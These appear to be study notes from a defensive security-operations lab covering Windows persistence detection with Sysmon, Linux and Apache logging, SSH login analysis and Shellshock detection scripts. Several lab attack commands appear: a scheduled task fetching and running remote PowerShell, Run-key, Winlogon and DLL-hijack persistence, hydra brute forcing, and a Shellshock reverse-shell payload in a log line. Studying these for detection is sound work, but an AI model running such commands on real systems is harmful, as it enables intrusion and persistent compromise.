`rundll32.exe` is executed from our VindowsUpdate service with a PID of 3332. The `rundll32.exe` file loads DLLs in the Windows environment. In this case, it is the staged Meterpreter DLL payload.

Investigate **NetworkConnect** events with the same filter parameters for PID

```pwsh
Get-SysmonEvent 3 "10/29/2021 12:33:41" | Where-Object { $_.properties[3].value -eq 3332 } | Format-List
```

A defender could watch for changes or additions to key values in `HKLM\System\CurrentControlSet\Services\`.

Look for a ProcessCreate event where the ParentImage is `dropper.exe`.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[20].value -like "*dropper.exe*" } | Format-List
```

Look for a **FileCreate** event. Filter on the **Image** field containing a filename that matches `rundll32.exe`

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for a **DnsQuery** event where the Image field contains the file `exercise_service.exe`.

```pwsh
Get-SysmonEvent 22 | Where-Object { $_.properties[7].value -like "*exercise_service.exe*" } | Format-List
```

Look for a **NetworkConnect** event within the same minute of the DnsQuery event where the destination IP is 192.168.51.50

```pwsh
Get-SysmonEvent 3 | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

### Persisting via Scheduled Tasks

```pwsh
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore
```

Scheduled tasks are  stored in `C:\Windows\System32\Tasks` and are accessible only with Administrative privileges. E.g., `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachineCore`

```bat
schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
```

Event 469813 indicates that a new scheduled task was installed.

```pwsh
Get-SecurityEvent 4698 "11/12/2021 7:26:00" "11/12/2021 7:27:00" | Format-List
```

Examine the ProcessCreate (schtasks command)

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

FileCreate event: `C:\Windows\System32\Tasks\WindowzUpdate` file creation from `svchost.exe`

```pwsh
Get-SysmonEvent 11 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

ProcessCreate event

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
```

DNSEvent, NetworkConnect

```pwsh
Get-SysmonEvent 22 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
Get-SysmonEvent 3 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
```

Find the FileCreate event where the **TargetFilename** matches the Command listed in the newly-created Scheduled Task

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[5].value -like "*exercise_schedtask.exe*" } | Format-List
```

Find a ProcessCreate event where the **Image** matches the command in the newly-created scheduled task

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*exercise_schedtask.exe*" } | Format-List
```

### Persisting by DLL-Sideloading/Hijacking

For both of these techniques, the vulnerability lies with **DLL search order**.

When Windows loads a DLL for an application, the OS follows a series of checks to locate the DLL.

1. The OS checks if the DLL has been loaded into memory.

2. The system will review a list of known DLLs in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`, which stores the names and locations of commonly-used DLLs (located in `C:\Windows\system32`).

3. What happens next in the search for a DLL depends on whether the **SafeDllSearchMode** key in `HKLM\System\CurrentControlSet\Control\Session Manager\` is enabled or disabled.

- By default, **SafeDllSearchMode** is enabled. Windows will search for the DLL in the directory where the program was executed, followed by System directories and the Windows directory.

- If **SafeDllSearchMode** is disabled, Windows will search where the program was executed as well as the **current directory** of the user (if applicable), before System directories and the Windows directory.

**DLL sideloading**: the malicious DLL is placed in the same directory as the application itself.

**DLL hijacking**: instead of placing the malicious DLL alongside the application, the DLL is inserted somewhere along the sequence of directories that Windows checks.

E.g., DLL hijacking involves the On-Screen Keyboard accessibility feature in Windows. One of the DLLs is `HID.dll`, a USB interface library that supports control between USB devices and whatever application requires them.

When the On-Screen Keyboard is loaded, Windows begins its search for all DLLs, including `HID.dll`. However, Windows first looks in `C:\Program Files\Common Files\microsoft shared\ink` for the DLL before moving on to `C:\Windows\System32`. Under normal circumstances, the DLL will be found in the System32 directory and execution of the application succeeds. However, an attacker with sufficient privileges could store a malicious DLL in the ink subdirectory and hijack the DLL search order.

```bat
copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"
osk
```

FileCreate event was generated when we wrote HID.dll to the new directory

```pwsh
Get-SysmonEvent 11 "11/18/2021 9:03:23" "11/18/2021 9:03:25" | Format-List
```

Search for ProcessCreate events in which the parent image is `osk.exe`.

```pwsh
Get-SysmonEvent 1 "11/18/2021 9:03:24" | Where-Object { $_.properties[20].value -like "*osk*" } | Format-List
```

search for NetworkConnect events where the Image field contains the file

```pwsh
Get-SysmonEvent $null "11/18/2021 10:22:06" | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for the ProcessCreate events with On-Screen Keyboard's file in the Image field.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*osk*" } | Format-List
```

Look for a CreateRemoteThread event where the **TargetImage** matches the new process

```pwsh
Get-SysmonEvent 8 | Where-Object { $_.properties[6].value -like "*lsass.exe*" } | Format-List
```

## Persistence in Registry

### Using Run Keys

When a user logs in to the system, the programs listed in these keys are automatically run:

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The **RunOnce** key is cleared after a user logs on. => not viable for persistence.

The **Run** key will persist no matter how many times the user logs on.

**RunOnceEx**: The program listed in this key will run once, but it will not be cleared until the program has completed execution.

The **HKEY_CURRENT_USER** hive contains data specific to the user that is currently logged in. This includes the Run/RunOnce keys, which are specific to that one user currently logged in to the endpoint.

The **HKEY_LOCAL_MACHINE** hive maintains configuration information for the endpoint itself, and has Run/RunOnce keys that will execute when any user logs in.

```bat
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
```

```bat
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdote /t REG_SZ /d "C:\tools\windows_persistence\prst_runshell443.exe" /f
```

examining the ProcessCreate event (reg add)

```pwsh
Get-SysmonEvent 1 "11/15/2021 8:49:11" "11/15/2021 8:49:13" | Format-List
```

Registry events

```pwsh
Get-SysmonEvent 13 "11/15/2021 8:49:11" "11/15/2021 8:49:13" | Format-List
```

search for a Logon event (Event 4624)7 with a Logon Type of 10 and the authenticating user is Administrator

```pwsh
Get-SecurityEvent 4624 | Where-Object { $_.properties[8].value -eq 10 -and $_.properties[5].value -eq "Administrator" }
```

Search for ProcessCreate events containing the filename `prst_runshell443.exe` in the **Image** field

```pwsh
Get-SysmonEvent 1 "11/15/2021 11:42:10" | Where-Object { $_.properties[4].value -like "*prst_runshell443.exe*" } | Format-List
```

Find a ProcessCreate event where the **ParentCommandLine** contains the file listed in the Run key that has been created.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[21].value -like "*farmer.vbs*" } | Format-List
```

Find a NetworkConnect event where the Image field contains the file `squeaker.exe`

```pwsh
Get-SysmonEvent 3 | Where-Object { $_.properties[4].value -like "*squeaker.exe*" } | Format-List
```

### Using Winlogon Helper

When authenticating to a Windows endpoint, the OS relies on the Windows Logon (Winlogon) process.

Winlogon controls everything between the load of a user profile and the unlocking of the workstation.

Winlogon draws from information stored in the HKEY_CURRENT_USER hive when creating the separation of duties for a logged in user, but its own configuration is in HKEY_LOCAL_MACHINE.

It is stored at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` and contains several subkeys that are applicable to every user that authenticates.

3 of them are at risk for abuse:

- The **Shell** subkey refers to the executable to run as the default shell for users logging in to Windows. The default value in this key is `explorer.exe`. Logging in to a workstation or accessing the system via Remote Desktop will invoke the default shell for any user. If a malicious executable is added to the default shell value, it will be loaded alongside the default shell.

- The **UserInit** subkey points to an executable that Winlogon uses for every user that logs in. The default executable (`userinit.exe`) will run the default shell as well as load the fonts, colors, and wallpaper for the current user.

- The **Notify** subkey exists by default in older versions of Windows up to Windows 7. This subkey contains keys and other configuration entries for Winlogon's notification packages. Attackers could change the value of the **DLLName** subkey to a malicious DLL, which Winlogon will load.

```bat
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\tools\windows_persistence\prst_winlogshell443.exe" /f
```

ProcessCreate event (reg.exe)

```pwsh
Get-SysmonEvent 1 "11/17/2021 12:24:29" "11/17/2021 12:24:31" | Format-List
```

RegistryEvent

```pwsh
Get-SysmonEvent 13 "11/17/2021 12:24:29" "11/17/2021 12:24:31" | Format-List
```

ProcessCreate event (ParentImage is `userinit.exe`)

```pwsh
Get-SysmonEvent 1 "11/17/2021 12:24:30" | Where-Object { $_.properties[4].value -like "*winlogshell443.exe*" } | Format-List
```

=> Searching for processes where the ParentImage is `userinit.exe` but the Image is not `explorer.exe` might find anomalous processes enabling persistence.


# Linux Endpoint Introduction

```bash
vncviewer 192.168.51.13:5901
```

## Logging on Linux and the Syslog Framework

On Linux systems, log files are usually saved within the `/var/log` folder:
-	`rsyslog/journal`: logs generated by the log manager.
-	Kernel logs: : events generated by the Linux kernel.
-	Audit logs: specially-crafted kernel logs generated by the audit daemon.
-	Applications/Daemons Logs: sshd, firewalld, and application-specific logs, such as Apache and MySQL.

Note: above categories can span multiple files. E.g., kernel logs appear in both audit and messages log files.

| PURPOSE	        | SOURCE PROCESS   | CENTOS LOCATION | UBUNTU LOCATION |
| --------------- | ---------------- | --------------- | --------------- |
| Authentication  | sudo, sshd, etc. | secure | auth.log |
| Web Server      | apache           | httpd/ | apache2/ |
| System Logs     | systemd, kernel, rsyslogd | messages | syslog |
| Package management Logs | dpkg    | yum.log | dpkg.log |

```bash
sudo grep sshd /var/log/secure
```

The **Syslog Daemon** is responsible for receiving syslog messages from local applications through either the traditional `/dev/log` socket or via the more recent **systemd-journald** module.

It can then write them to specific log files, typically contained in the `/var/log` folder and, if configured, forward them through a transport protocol to one or more syslog servers for centralized log collection.

Multiple log management solutions derived from the initial syslog architecture: rsyslog, syslog-ng and nxlog.

=> **rsyslog** has become the de-facto standard on many Linux distributions.

The 1st attempt to standardize log file formatting (**RFC3164**) introduced fields such as priority number, timestamp, and hostname, among others.

An official standard was formalized later via **RFC5424**, most log management applications remain backwards-compatible to the fields specified by RFC3164.

rsyslog configuration on the CentOS machine under the `/etc/rsyslog.conf.rfc` file translates any raw message entering `/var/log/messages` into an **RFC3164**-like format

```
...
#### RULES ####
$template RFC3164fmt,"<%PRI%>%TIMESTAMP% %HOSTNAME% %syslogtag%%msg%\n"
...
# The authpriv file has restricted access.
authpriv.*                                              /var/log/secure;RFC3164fmt
...
# Forwarding to remote syslog collectors
# ----------------------------
#*.*	@linux01     # udp transport
#*.*	@@linux01    # tcp transport
```

Make a backup of the current configuration > copy the custom configuration to our target > restart the rsyslog service

```bash
sudo cp /etc/rsyslog.conf /etc/rsyslog.conf.old
s
udo cp /etc/rsyslog.conf.rfc /etc/rsyslog.conf
sudo systemctl restart rsyslog
```

RFC3164 syslog format:
-	**Priority**: "<86>" - This value is a combined value derived by the **facility** and the **severity** fields. The resulting **priority** value indicates the importance of the message (the lower the value, the higher the priority).
- **Timestamp**: "Jun 28 12:05:21" - Indicates the original time and date the log message was generated.
-	**Hostname** - Describes which host initially generated the log event. This field is important when correlating events on a syslog server that gathers logs from multiple hosts.
- App name: "sshd" - Indicates from which process the log event originated.
-	Process id - the process ID related to the application: might be important to trace back the log message's originating process.
-	message "Failed password for offsec from 192.168.51.50 port 54209 ssh2"

### Syslog Facilities Codes

The facility code specifies the program that first generated the log entry, which ranges from 0 to 23.

| FACILITY CODE |	KEYWORD	| DESCRIPTION |
| -- | ---- | ---- |
| 0  | kern | Kernel messages |
| 1	 | user	| User-level messages |
| 2  | mail	| Mail system |
| 3	 | daemon	| System daemons |
| 4	 | auth	| Security/authentication messages |
| 5	 | syslog	| Messages generated internally by syslogd |
| 6	 | lpr | Line printer subsystem |
| 7	 | news	| Network news subsystem |
| 8	 | uucp	| UUCP subsystem |
| 9	 | cron	| Cron subsystem |
| 10 | authpriv	| Security/authentication messages |
| 11 | ftp | FTP daemon |
| 12 | ntp | NTP subsystem |
| 13 | security |	Log audit |
| 14 | console | Log alert |
| 15 |	solaris-cron | Scheduling daemon |
| 16–23	| local0 – local7	| Locally used facilities |

Custom applications may use Facility values from 16 to 23.

### Syslog Severity Levels

The severity level is a numeric value spanning from 0 to 7 that represents the criticality of a syslog event.

| VALUE	| SEVERITY | KEYWORD | DESCRIPTION |
| ---- | ---- | ---- | ---- |
| 0	| Emergency	| emerg | System is unusable - A panic condition |
| 1	| Alert	| alert | Action must be taken immediately |
| 2	| Critical | crit | Critical conditions |
| 3	| Error	| err	| Error conditions |
| 4	| Warning	| warning	| Warning conditions |
| 5	| Notice | notice	| Normal but significant conditions |
| 6	| Informational | info | Informational messages |
| 7 |	Debug | debug | Debug-level messages |

The priority field indicates the importance of the message by deriving its value from the severity and facility parameters using the following formula:

Syslog Priority = (facility * 8) + (severity)

## Rsyslog Meets Journal

2 processes are responsible for log creation and log processing: systemd-journal and rsyslog

The **systemd** software suite has become the de-facto standard for configuration and service management on almost every Linux distribution.

The **systemd_journald**, or journal in short, is one of the components responsible for centralizing log management that aims to eventually replace syslog entirely.

systemd journal compresses log messages into a binary format, as opposed to the plain-text output of syslog.

Rsyslog has replaced the legacy syslog daemon (syslogd) and comes installed by default on nearly every Linux distribution.

To provide backwards compatibility with older UNIX systems, **rsyslog runs in parallel with journal** and reads its syslog messages as they arrive. It then processes and saves them to local files or, if configured, remote servers.

The journal daemon can run solo or in combination with the rsyslog daemon, based on our configuration needs.

Trace the process that has the /var/log/secure log file currently open

```bash
sudo lsof -p $(pgrep syslogd) | grep '/var/log/secure'
```

The original syslog event (generated by the SSH daemon) is forwarded to the journal daemon first, after which the rsyslog daemon reads from the journal logs via the **imjournal** module.

To confirm that rsyslog reads the syslog messages from journald, examine the `/etc/rsyslog.conf` configuration file.

```
...
#### MODULES ####
	
module(load="imuxsock"
       SysSock.Use="off") # provides support for local system logging (e.g. via logger command)
#module(load="imklog")   # provides kernel logging support (previously done by rklogd)
#module(load"immark")  # provides --MARK-- message capability

# provides access to the systemd journal and file to store the position in the journal
module(load="imjournal" StateFile="imjournal.state")
...
```

Note that although Ubuntu systems adopt the traditional **imuxsock** module as the default rsyslog configuration, the end result is equivalent to CentOS', as they both result in two identical copies of the same log event, with one copy in the rsyslog log file and another copy in the journal logs.

```bash
journalctl -u sshd.service --since "1 hour ago"
sudo tail /var/log/secure
```

## Web Daemon Logging

Each time we access a resource, such as a web page running on an Apache server, an access log is generated under `/var/log/httpd/access_log`, or for CentOS or Ubuntu, `/var/log/apache2/access.log`.

```bash
sudo systemctl start httpd
```

```bash
sudo cat /var/log/httpd/access_log
```

```
192.168.51.50  - - [12/Jul/2021:08:57:30 -0400] "GET / HTTP/1.1" 403 199691 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Apache logs follow the **Combined Log Format** (CLF) syntax, meaning each field is delimited by a hyphen (-) or a blank space.
-	192.168.51.50 : The source IP that requested the web resource
-	\- -: As Remote Log Name and User ID do not appear in the log, these are replaced with a hyphen (-)
-	[12/Jul/2021:08:57:30 -0400]: Date and Time Zone (timestamp)
-	GET: Request method
-	/: The resource path, in this case the web server's root folder
-	HTTP/1.1: Request version
-	403: Response status3
-	199691: The resource size
-	\- : Since the referer of the resource is also not present, it is replaced with a hyphen (-)
-	Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0: Client User Agent

Extract all logs with a Response Status of 403

```bash
sudo cat /var/log/httpd/access_log | grep " 403 "
```

Extract a single log parameter, such as the path to the requested resource

```bash
sudo cat /var/log/httpd/access_log  | cut -d " " -f 7
```

Find the mod_ssl related error under the `/var/log/httpd/error_log` file

## Python for Log Analysis

Create a Python script to search for SSH-related events inside the raw authentication log files.

Regex are special string sequences used by **search** or **search_and_replace** functions, among others, to match patterns within a text in a clear-cut manner.

4 essential regex operators:
-	^ matches position just before the first character of the string
-	$ matches position just after the last character of the string
-	. matches a single character, except the newline (\n) character
-	\* matches preceding match zero or more times

E.g., a simple regex pattern to match every line containing the word "cat", followed by any other combination of characters, would be cat.*.

```bash
sudo python3 ssh_log_parser.py
```

```python
#!/usr/bin/env python

import re
import os.path

centos_ssh_log_file_path = "/var/log/secure"
ubuntu_shh_log_file_path = "/var/log/auth.log"

ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

regex = 'sshd\[.*\]'
for log_file in ssh_log_files:
    if os.path.isfile(log_file) :
        with open(log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex, line, re.S):
                    print(line,end = '')
```

```bash
sudo python3 apache_log_parser.py
```

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_shh_log_file_path = "/var/log/apache2/access.log"

apache_log_files = [centos_apache_log_file_path,ubuntu_shh_log_file_path]

regex = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\"'
for log_file in apache_log_files:
    if os.path.isfile(log_file):
        with open(log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex, line, re.S):
                    log_line = (re.match(regex, line)).groups()
                        print(log_line[0])
```


The regex consists of 9 capturing patterns, each of which matches a specific pattern of the log line:
-	([(\d.)]+) searches for the Source_IP; it matches any sequence of digits of undefined length.
-	\- - represent Remote Log Name and User Id; it matches two literal hyphens, which stand for empty fields.
-	[(.*?)] searches for the timestamp field by examining for any character in between opening and closing square brackets.
-	"(.*?)" searches for the Request_Method, Resource_Path and Request_Version, matching any value in double quotes.
-	(\d+) searches for the Response Status by matching any numerical value sequence.
-	(\d+) searches for the Resource_Size using the same method as above.
-	"(.*?)" searches for the Referer in literal double quotes.
-	"(.*?)" uses the same matching pattern once again to search for the User Agent comprised between double quotes.

Once we receive a regex match, we need to combine each matched group as a Python tuple to the log_line variable. This will enable us to access each web log field as a positional argument.

E.g., To print the client source IP only: `print(log_line[0])`

## DevOps Tools

Ansible Playbook `log_parser.yml`

```yaml
---
- name: logparser
  hosts: soc200
  tasks:

   - name: list files in folder
     become: yes
     become_user: root
     script: /home/kali/SOC-200/Linux_Endpoint_Introduction/ssh_log_parser.py
     args:
        executable: python3
     register: output
   - debug: var=output.stdout_lines
```

```bash
sudo ansible soc200 -m ping -u offsec  --key-file=/home/kali/.ssh/ansible_rsa
```

```bash
ansible-playbook ./log_parser.yml -u offsec  --key-file='/home/kali/.ssh/ansible_rsa' -K
```

## Hunting for Login Attempts

```bash
sudo cat /var/log/secure | grep "Accepted password"
sudo cat /var/log/secure | grep "Failed password"
```

`sudo python3 ssh_login_check.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_ssh_log_file_path = "/var/log/secure"
ubuntu_shh_log_file_path = "/var/log/auth.log"

ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

regex_valid_login = 'sshd\[.*\]*Accepted password'
regex_failed_login = 'sshd\[.*\]*Failed password'
for log_file in ssh_log_files:
    if os.path.isfile(log_file) :
        with open(log_file, "r") as file:
            for line in file:
		            for match in re.finditer(regex_valid_login, line, re.S):
		                print("[*] Valid SSH Login found:\n\t"   + line,end = '')
		            for match in re.finditer(regex_failed_login, line, re.S):
		                print("[!] INVALID SSH Login found:\n\t" + line,end = '')
```

# Linux Server Side Attacks

The SSH password authentication mechanism makes use of the Linux Pluggable Authentication Modules (PAM) library, which is responsible for checking that the password belonging to the requested username corresponds to the one present in the `/etc/shadow` password file.

**Public-key authentication** will be our 1st choice if both it and **password authentication** are enabled and no specific order is configured under the `PreferredAuthentications` directive

```bash
sudo cat /etc/ssh/sshd_config | grep PasswordAuth
```

## Suspicious Logins

Public-key authentication works with a key-pair, composed of a public and a private key.

- The entire key-pair is located on the client
- The server trusts the client by storing only its public key.

During the authentication process, the SSH server first verifies the client's identity through the username and public-key association before sending a random challenge message to the client.

The client then encrypts the server's challenge message with its own private key to send back to the server.

To enable public key authentication on a Linux SSH server,  generate a key-pair on the client host.

```bash
ssh-keygen -t Ed25519
```

Private key (`/home/kali/.ssh/id_ed25519`) needs to be kept undisclosed

Public key (`/home/kali/.ssh/id_ed25519.pub`) is going to uploaded to the SSH server.

Copy the public key to the SSH server along with the username we want to associate it with.

```bash
ssh-copy-id offsec@192.168.51.12
```

The SSH server trust our local public key, map it to the offsec user, and store it inside the `~/.ssh/authorized_keys` under the offsec user's home folder.

```bash
ssh offsec@192.168.51.12 -v
```

Verify the public key authentication configuration section.

```bash
sudo cat /etc/ssh/sshd_config | grep Pubkey
```

Password-only authentication: disable the public key authentication option by un-commenting the line as follows.

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication no
...
PasswordAuthentication yes
```

```bash
sudo systemctl restart sshd
```

```bash
sudo tail -f /var/log/auth.log
```

Public key only authentication:

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication yes
...
PasswordAuthentication no
```

Simulate an invalid public key login:

```bash
ssh offsec@192.168.51.12  -i .ssh/id_ed25519_rogue
```

The **preauth** keyword in square brackets => something went wrong in the pre-authentication process.

Increase the **log verbosity** on the SSH server side

```bash
sudo nano /etc/ssh/sshd_config
...
#LogLevel INFO
LogLevel DEBUG1
```

An explicit message about the offsec user providing a wrong ED25519 public key while authenticating to the server:

```bash
sudo tail -f /var/log/auth.log
```

Both public key and password authentication are enabled

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication yes
...
PasswordAuthentication yes
```

Highlight discrepancies within the logging history

2 principal functions:

- `log_file_parser` parses the log file in search of suspicious and interesting log events,

- `log_line_parser` extrapolates only the critical information such as authentication status, username, and source IP.

Script arguments:

1. The authentication method `log_type` can be either `pubkey`, `password`, or `all`, depending on the event we want to filter.

2. `log_scope` is related to the authentication status and can be either `valid`, `failed`, or `all`.

3. A debugging feature that allows us to translate the original log line in the `verbose` format, or a trimmed down version of it with the `off` option.

`python3 ssh_suspicious_logons.py pubkey failed off`

```python
#!/usr/bin/env python

import re
import sys
import os.path


def usage():
    print("Usage: "   + sys.argv[0] + " [AUTHENTICATION METHOD] [SCOPE] [DEBUG]")
    print("Usage: "   + sys.argv[0] + " [pubkey|password|all] [valid|failed|all] verbose|off")
    print("Example: " + sys.argv[0] + " pubkey failed off")
    sys.exit()

def log_line_parser(line):
    global debug
    match0 = re.search('^(...).(..).(..:..:..)',line)
    match1 = re.search('for(.+?)from', line)
    match2 = re.search('from(.+?)port', line)
    match3 = re.search('sshd\[.*\]:(.+?)for',line)
    timestamp   = match0.group()
    username    = match1.group(1)
    ipaddress   = match2.group(1)
    auth_result = match3.group(1)
    if debug:
        print(line,end = '')
    else:
        print(timestamp + auth_result + username + ipaddress)

def log_file_parser(log_type,log_scope):
    centos_ssh_log_file_path = "/var/log/secure"
    ubuntu_shh_log_file_path = "/var/log/auth.log"

    ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

    password_valid_login  = 'sshd\[.*\]*Accepted password'
    password_failed_login = 'sshd\[.*\]*Failed password'
    pubkey_valid_login    = 'sshd\[.*\]*Accepted publickey'
    pubkey_failed_login   = 'sshd\[.*\]*Failed publickey'

    for log_file in ssh_log_files:
        if os.path.isfile(log_file) :
            with open(log_file, "r") as file:
                for line in file:

                    if log_scope == 'valid' or log_scope == 'all':
                        if log_type == 'password' or log_type == 'all':
                            for match in re.finditer(password_valid_login, line, re.S):
                                log_line_parser(line)
                        if log_type == 'pubkey' or log_type == 'all':
                            for match in re.finditer(pubkey_valid_login, line, re.S):
                                log_line_parser(line)

                    if log_scope == 'failed' or log_scope == 'all':
                        if log_type == 'password' or log_type == 'all':
                            for match in re.finditer(password_failed_login, line, re.S):
                                log_line_parser(line)
                        if log_type == 'pubkey' or log_type == 'all':
                            for match in re.finditer(pubkey_failed_login, line, re.S):
                                log_line_parser(line)

if __name__ == '__main__':
    if len(sys.argv) > 3:
        log_type    = sys.argv[1]
        log_scope   = sys.argv[2]
        verbose     = sys.argv[3]

        if verbose == 'verbose':
            debug = True
        else:
            debug = False
        log_file_parser(log_type,log_scope)

    else:
        usage()
```

## Password Brute Forcing

Empty a log file

```bash
sudo truncate /var/log/auth.log --size 0
```

```bash
hydra -l alice -P ./dict_bf.txt  192.168.51.12 -t 1 ssh
```

```bash
sudo cat /var/log/auth.log | grep "sshd\["
```

The `MaxAuthTries` parameter from the SSH config file matches the total number of failed authentication attempts, which then forces the current session to disconnect.

A threshold value has been reached.

**Disconnecting authenticating user alice 192.168.51.50 port 55762: Too many authentication failures [preauth]**

This threshold value could potentially be employed to trigger either firewall rules or `fail2ban` to enact a lockout period for the targeted accounts.

=> Use this warning message as an indicator for triggering account lockouts.

Upgrade the standard brute forcing attack to a password spraying attack by running the attack with a password dictionary sized just below the lockout threshold against every username within a company.

=> not only allow the attacker to stay under the radar, but also increase the chances of guessing the correct password across multiple accounts.

Password spraying is often more effective than expected as password reuse among multiple accounts is not that uncommon.

hydra's `-u` option, allows us to loop first between users as opposed to passwords.

## Command Injection

```bash
sudo truncate /var/log/apache2/*.log --size 0
```

```bash
cat /var/log/apache2/access.log
```

**Shellshock** allows an attacker to execute system commands via an unintended processing of environment variables.

Showcase a CGI-based web server as a compromised vector, which is already preconfigured on the Apache server running, along with the vulnerable Bash version (4.3).

```bash
./shellshock.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
```

```bash
cat /var/log/apache2/access.log
```

192.168.51.50 - - [02/Aug/2021:03:57:11 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 151 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"

The last field of the Apache log format is supposed to be the `User-Agent` field, which is suspiciously empty ("-").

The second-to-last field would normally contain the HTTP `Referer` header, but instead, a reverse-shell attack that connects back to the Kali lab machine.

```bash
sudo ps aux | grep "/bin/bash"
```

The bash process has been invoked by the `www-data` user, which corresponds to the Apache web server process.

`python3 shellshock_log_detector.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"

apache_log_files = [centos_apache_log_file_path,ubuntu_apache_log_file_path,ubuntu_custom_log_file_path]

web_log_regex = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\"'
shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
for log_file in apache_log_files:
        if os.path.isfile(log_file) :
                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(web_log_regex, line, re.S):
                            log_line = (re.match(web_log_regex, line)).groups()
                            for match in re.finditer(shellshock_regex, log_line[5], re.S):
                                if log_line[3] != '200':
                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
                                elif log_line[3] == '200':
                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
                                    print(log_line)
```

The Shellshock attack vector embeds the payload inside the `Referer` HTTP Header, but can also store it in any part of the HTTP Request, such as the `Cookie` header, as long as the web server processes it and triggers the vulnerability.

```bash
./shellshock_cookie.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
```

```bash
sudo cat /var/log/apache2/access.log
```

Surprisingly, we now lack all kinds of evidence around the attacker's Shellshock payload as the `Referer` payload is now empty.

The default Apache logging behavior doesn't save any information about the `Cookie` HTTP header => a stealthier approach.

Integrate the Apache configuration with a custom logging format that supports the Cookie header and saves the log events into a separate file.

Changes needed in the vhost configuration file.

```bash
cat /etc/apache2/sites-enabled/000-default.conf
```

```
<VirtualHost *:80>
...
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

 	LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{Cookie}i\" with_cookies
	CustomLog /var/log/apache2/with_cookies.log with_cookies
	
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

```bash
cat /var/log/apache2/with_cookies.log
```

`python3 shellshock_log_detector_cookies.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"

apache_log_files = [ubuntu_custom_log_file_path]

web_log_regex_cookie = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\" \"(.*?)\"'
shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
for log_file in apache_log_files:
        if os.path.isfile(log_file) :
                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(web_log_regex_cookie, line, re.S):
                            log_line = (re.match(web_log_regex_cookie, line)).groups()
                            for match in re.finditer(shellshock_regex, log_line[7], re.S):
                                if log_line[3] != '200':
